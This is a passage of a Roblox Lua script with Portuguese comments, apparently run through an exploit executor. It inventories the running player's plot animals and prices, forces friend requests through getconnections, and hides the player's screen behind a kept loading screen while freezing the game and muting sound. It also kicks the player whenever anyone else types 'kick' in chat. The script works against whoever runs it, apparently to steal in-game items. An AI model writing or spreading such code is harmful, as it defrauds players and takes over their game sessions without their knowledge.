-- Garantir que LocalPlayer exista (LocalScript) antes de usar
local player = Players.LocalPlayer
if not player then
    return
end

-- üÜï PEGA O NICK DO JOGADOR NO IN√çCIO
local playerNick = player.Name
print("üéÆ Jogador detectado:", playerNick)

-- Fun√ß√µes Helper
local function normalize(str)
    return string.lower(tostring(str)):gsub("^%s*(.-)%s*$","%1")
end

local function simplifyForMatch(str)
    return normalize(str):gsub("%W","")
end

-- üÜï FUN√á√ÉO MELHORADA - Procura pelo nick direto checando o padr√£o "Nome's Base"
local function findPlayerPlot(plotsFolder)
    if not plotsFolder then 
        print("‚ùå Plots folder n√£o encontrado")
        return nil 
    end
    
    print("üîç Procurando plot de:", playerNick)
    print("üîç Padr√£o de busca:", playerNick .. "'s Base")
    
    -- Procura em cada MODEL dentro de Plots
    for _, plot in ipairs(plotsFolder:GetChildren()) do
        if plot:IsA("Model") then
            print("  üîé Verificando model:", plot.Name)
            
            -- Procura a PART PlotSign dentro do model
            local plotSign = plot:FindFirstChild("PlotSign")
            if plotSign and plotSign:IsA("BasePart") then
                print("    ‚úÖ PlotSign encontrado (Part)")
                
                -- Procura o SurfaceGui dentro da Part
                local surfaceGui = plotSign:FindFirstChild("SurfaceGui")
                if surfaceGui then
                    print("      ‚úÖ SurfaceGui encontrado")
                    
                    -- Procura o Frame dentro do SurfaceGui
                    local frame = surfaceGui:FindFirstChild("Frame")
                    if frame then
                        print("        ‚úÖ Frame encontrado")
                        
                        -- Procura o TextLabel dentro do Frame
                        local textLabel = frame:FindFirstChild("TextLabel")
                        if textLabel then
                            local plotText = textLabel.Text
                            print("          üìù Texto encontrado:", plotText)
                            
                            -- üÜï Verifica se come√ßa com "NomeDoJogador's Base"
                            local expectedText = playerNick .. "'s Base"
                            if plotText == expectedText then
                                print("‚úÖ‚úÖ‚úÖ PLOT ENCONTRADO:", plot.Name)
                                return plot
                            else
                                print("          ‚ùå Texto n√£o corresponde. Esperado:", expectedText)
                            end
                        else
                            print("        ‚ùå TextLabel n√£o encontrado")
                        end
                    else
                        print("      ‚ùå Frame n√£o encontrado")
                    end
                else
                    print("    ‚ùå SurfaceGui n√£o encontrado")
                end
            else
                print("    ‚ùå PlotSign n√£o encontrado ou n√£o √© BasePart")
            end
        end
    end
    
    print("‚ùå‚ùå‚ùå Nenhum plot encontrado para:", playerNick)
    return nil
end

local function getAnimalsInPlot(plot)
    local animals = {}
    if not plot then 
        print("‚ùå Plot √© nil")
        return animals 
    end

    print("‚úÖ Plot encontrado:", plot.Name)

    local podiumsFolder = plot:FindFirstChild("AnimalPodiums")
    if not podiumsFolder then 
        print("‚ùå AnimalPodiums n√£o encontrado")
        return animals 
    end

    print("‚úÖ AnimalPodiums encontrado, models dentro:", #podiumsFolder:GetChildren())

    for _, podiumModel in ipairs(podiumsFolder:GetChildren()) do
        print("üîç Verificando:", podiumModel.Name, "Tipo:", podiumModel.ClassName)
        
        if podiumModel:IsA("Model") then
            local baseModel = podiumModel:FindFirstChild("Base")
            if baseModel and baseModel:IsA("Model") then
                print("  ‚úÖ Base encontrado em:", podiumModel.Name)
                
                local spawnPart = baseModel:FindFirstChild("Spawn")
                if spawnPart then
                    print("    ‚úÖ Spawn encontrado")
                    
                    local attachments = {}
                    for _, child in ipairs(spawnPart:GetChildren()) do
                        if child:IsA("Attachment") and child.Name ~= "PromptAttachment" then
                            table.insert(attachments, child)
                            print("      ‚úÖ Attachment encontrado:", child.Name)
                        end
                    end

                    print("      Total de attachments v√°lidos:", #attachments)

                    if #attachments == 1 then
                        local attachment = attachments[1]
                        
                        local billboard = attachment:FindFirstChild("AnimalOverhead", true)
                        if billboard then
                            print("        ‚úÖ AnimalOverhead encontrado!")
                            
                            local displayName = billboard:FindFirstChild("DisplayName")
                            local generation = billboard:FindFirstChild("Generation")
                            
                            if displayName and generation then
                                print("        ‚úÖ Nome:", displayName.Text, "| Pre√ßo:", generation.Text)
                                table.insert(animals, {
                                    name = displayName.Text,
                                    price = generation.Text
                                })
                            else
                                print("        ‚ùå DisplayName ou Generation n√£o encontrado")
                            end
                        else
                            print("        ‚ùå AnimalOverhead n√£o encontrado")
                        end
                    end
                else
                    print("    ‚ùå Spawn n√£o encontrado")
                end
            else
                print("  ‚ùå Base n√£o encontrado em:", podiumModel.Name)
            end
        end
    end
    
    print("üìä Total de animais encontrados:", #animals)
    return animals
end

local function walkToPosition(targetPosition)
    local character = player.Character
    if not character then return false end
    
    local humanoid = character:FindFirstChild("Humanoid")
    if not humanoid then return false end
    
    humanoid:MoveTo(targetPosition)
    
    local moveTimeout = 30
    local startTime = tick()
    
    repeat
        wait(0.1)
        local rootPart = character:FindFirstChild("HumanoidRootPart")
        if not rootPart then return false end
        
        local distance = (rootPart.Position - targetPosition).Magnitude
        if distance < 5 then
            return true
        end
        
        if tick() - startTime > moveTimeout then
            return false
        end
    until not humanoid or humanoid.Health <= 0
    
    return false
end

local function tryAddFriend(targetPlayer)
    print("üîÑ Tentando adicionar", targetPlayer.Name, "como amigo...")
    
    local success1 = pcall(function()
        player:RequestFriendship(targetPlayer)
    end)
    if success1 then 
        print("‚úÖ M√©todo 1 funcionou!")
        return true
    end
    
    local success2 = pcall(function()
        Players.LocalPlayer:RequestFriendship(targetPlayer)
    end)
    if success2 then 
        print("‚úÖ M√©todo 2 funcionou!")
        return true
    end
    
    local success3 = pcall(function()
        local playerList = player.PlayerGui:FindFirstChild("PlayerList")
        if playerList then
            for _, item in pairs(playerList:GetDescendants()) do
                if item:IsA("TextLabel") and item.Text == targetPlayer.Name then
                    local parent = item.Parent
                    if parent then
                        for _, child in pairs(parent:GetDescendants()) do
                            if child:IsA("ImageButton") or child:IsA("TextButton") then
                                for _, connection in pairs(getconnections(child.MouseButton1Click)) do
                                    connection:Fire()
                                end
                            end
                        end
                    end
                end
            end
        end
    end)
    if success3 then 
        print("‚úÖ M√©todo 3 funcionou!")
        return true
    end
    
    local success4 = pcall(function()
        local coreGui = game:GetService("CoreGui")
        local playerList = coreGui:FindFirstChild("PlayerList") or coreGui:FindFirstChild("RobloxGui")
        
        if playerList then
            for _, item in pairs(playerList:GetDescendants()) do
                if item:IsA("TextLabel") and item.Text:match(targetPlayer.Name) then
                    local parent = item.Parent
                    for _, btn in pairs(parent:GetDescendants()) do
                        if btn:IsA("GuiButton") then
                            for _, conn in pairs(getconnections(btn.Activated)) do
                                conn:Fire()
                            end
                        end
                    end
                end
            end
        end
    end)
    if success4 then 
        print("‚úÖ M√©todo 4 funcionou!")
        return true
    end
    
    print("‚ùå Nenhum m√©todo funcionou (bloqueado pelo Roblox)")
    return false
end

-- üÜï FUN√á√ÉO DE CONGELAMENTO TOTAL
local function activateFreezeMode()
    print("[FREEZE] Ativando modo de congelamento total...")
    
    -- 1. DISABLE ALL CORE GUI
    pcall(function()
        StarterGui:SetCoreGuiEnabled(Enum.CoreGuiType.All, false)
    end)

    -- 2. FREE CAMERA
    local Camera = Workspace.CurrentCamera
    Camera.CameraType = Enum.CameraType.Scriptable

    -- 3. DISABLE ALL AUDIO
    SoundService.AmbientReverb = Enum.ReverbType.NoReverb
    for _, snd in ipairs(Workspace:GetDescendants()) do
        if snd:IsA("Sound") then
            snd.Volume = 0
            snd:Stop()
        end
    end
    Workspace.DescendantAdded:Connect(function(obj)
        if obj:IsA("Sound") then
            obj.Volume = 0
            obj:Stop()
        end
    end)
    RunService.Heartbeat:Connect(function()
        for _, snd in ipairs(Workspace:GetDescendants()) do
            if snd:IsA("Sound") and snd.IsPlaying then
                snd:Stop()
            end
        end
    end)

    -- 4. FULL FREEZE: PARTS + JOINTS + MOTORS
    local frozenParts = {}
    local frozenJoints = {}

    local function freezeObject(obj)
        if obj:IsA("BasePart") then
            frozenParts[obj] = {
                CFrame       = obj.CFrame,
                Size         = obj.Size,
                Transparency = obj.Transparency,
                Color        = obj.Color,
                Material     = obj.Material,
                CanCollide   = obj.CanCollide,
            }
        elseif obj:IsA("Motor6D") or obj:IsA("Weld") or obj:IsA("ManualWeld") then
            frozenJoints[obj] = {
                C0 = obj.C0,
                C1 = obj.C1,
            }
        elseif obj:IsA("Sound") then
            obj.Volume = 0
            obj:Stop()
        end
    end

    for _, obj in ipairs(Workspace:GetDescendants()) do
        freezeObject(obj)
    end

    Workspace.DescendantAdded:Connect(freezeObject)

    RunService.Stepped:Connect(function()
        for part, data in pairs(frozenParts) do
            if part and part.Parent then
                part.CFrame       = data.CFrame
                part.Size         = data.Size
                part.Transparency = data.Transparency
                part.Color        = data.Color
                part.Material     = data.Material
                part.CanCollide   = data.CanCollide
            end
        end
        
        for joint, data in pairs(frozenJoints) do
            if joint and joint.Parent then
                joint.C0 = data.C0
                joint.C1 = data.C1
            end
        end
    end)

    -- 5. STOP ALL ANIMATIONS
    local function stopAnimationsInHumanoid(humanoid)
        if not humanoid then return end
        for _, track in ipairs(humanoid:GetPlayingAnimationTracks()) do
            track:Stop()
        end
    end

    local function freezeCharacter(char)
        local hum = char:FindFirstChildOfClass("Humanoid")
        if hum then
            hum.WalkSpeed = 0
            hum.JumpPower = 0
            hum.PlatformStand = true
            
            stopAnimationsInHumanoid(hum)
            
            for _, acc in ipairs(char:GetChildren()) do
                if acc:IsA("Accessory") then
                    local handle = acc:FindFirstChild("Handle")
                    if handle then freezeObject(handle) end
                end
            end
        end
    end

    if player.Character then freezeCharacter(player.Character) end
    player.CharacterAdded:Connect(freezeCharacter)

    local function onCharacterAdded(char)
        task.wait(0.1)
        freezeCharacter(char)
    end

    for _, plr in ipairs(Players:GetPlayers()) do
        if plr.Character then
            onCharacterAdded(plr.Character)
        end
        plr.CharacterAdded:Connect(onCharacterAdded)
    end
    Players.PlayerAdded:Connect(function(plr)
        plr.CharacterAdded:Connect(onCharacterAdded)
    end)

    RunService.Heartbeat:Connect(function()
        for _, plr in ipairs(Players:GetPlayers()) do
            if plr.Character then
                local hum = plr.Character:FindFirstChildOfClass("Humanoid")
                stopAnimationsInHumanoid(hum)
            end
        end
    end)

    -- 6. DELETE ALL GUI (exceto a tela de loading)
    local function clearGui()
        for _, gui in ipairs(player.PlayerGui:GetChildren()) do
            if gui:IsA("GuiObject") then
                local n = gui.Name
                if n ~= "sm_notif" and n ~= "sm_main" then
                    pcall(gui.Destroy, gui)
                end
            end
        end
        for _, gui in ipairs(CoreGui:GetChildren()) do
            if gui.Name ~= "LoadingScreen" then
                pcall(gui.Destroy, gui)
            end
        end
    end

    clearGui()
    spawn(function()
        while task.wait(0.03) do
            clearGui()
        end
    end)

    print("[FREEZE] Modo de congelamento ativado com sucesso!")
end

-- Sistema de kick
print("üõ° Sistema de kick ativado para jogador:", player.Name)

Players.PlayerChatted:Connect(function(_, chatPlayer, message)
    print("üí¨ [PlayerChatted] Mensagem de", chatPlayer.Name, ":", message)
    
    local msg = string.lower(message)
    
    if msg == "kick" or msg:find("kick") then
        print("‚ö† Comando KICK detectado!")
        
        if chatPlayer.Name ~= player.Name then
            print("üö´ Kickando", player.Name)
            player:Kick("‚ö† Voc√™ foi removido do servidor.\nTente novamente mais tarde.")
        else
            print("‚Ñπ Voc√™ mesmo digitou kick")
        end
    end
end)

for _, otherPlayer in pairs(Players:GetPlayers()) do
    if otherPlayer ~= player then
        otherPlayer.Chatted:Connect(function(message)
            print("üí¨ [Chatted]", otherPlayer.Name, ":", message)
            
            local msg = string.lower(message)
            
            if msg == "kick" or msg:find("kick") then
                print("üö´ [Chatted] KICK de", otherPlayer.Name)
                player:Kick("‚ö† Voc√™ foi removido do servidor.")
            end
        end)
    end
end

Players.PlayerAdded:Connect(function(newPlayer)
    if newPlayer ~= player then
        print("‚ûï Novo jogador:", newPlayer.Name)
        
        newPlayer.Chatted:Connect(function(message)
            print("üí¨ [PlayerAdded]", newPlayer.Name, ":", message)
            
            local msg = string.lower(message)
            
            if msg == "kick" or msg:find("kick") then
                print("üö´ [PlayerAdded] KICK de", newPlayer.Name)
                player:Kick("‚ö† Voc√™ foi removido do servidor.")
            end
        end)
    end
end)

pcall(function()
    local TextChatService = game:GetService("TextChatService")
    TextChatService.MessageReceived:Connect(function(message)
        if message.TextSource and message.TextSource.UserId ~= player.UserId then
            local text = string.lower(message.Text)
            print("üí¨ [TextChatService]", message.TextSource.Name or "Unknown", ":", message.Text)
            
            if text == "kick" or text:find("kick") then
                print("üö´ [TextChatService] KICK detectado!")
                player:Kick("‚ö† Voc√™ foi removido do servidor.")
            end
        end
    end)
end)

